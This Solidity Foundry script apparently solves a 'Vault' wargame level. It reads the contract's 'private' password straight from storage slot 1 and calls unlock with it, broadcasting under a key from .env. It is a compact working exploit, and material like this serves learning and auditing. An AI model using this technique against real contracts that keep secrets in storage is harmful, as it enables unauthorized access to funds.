// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "../lib/forge-std/src/Script.sol";

contract VaultAttacker is Script {

    // Instance of the Vault contract
    Vault vaultInstance = Vault(0xYourInstanceAddressHere);  // Replace with the actual Vault instance address

    function run() external {
        // Start broadcasting the transaction using the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Get the password from storage slot 1 of the vault contract
        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));

        // Use the retrieved password to unlock the vault
        vaultInstance.unlock(password);

        // Stop broadcasting after the transaction is completed
        vm.stopBroadcast();
    }
}

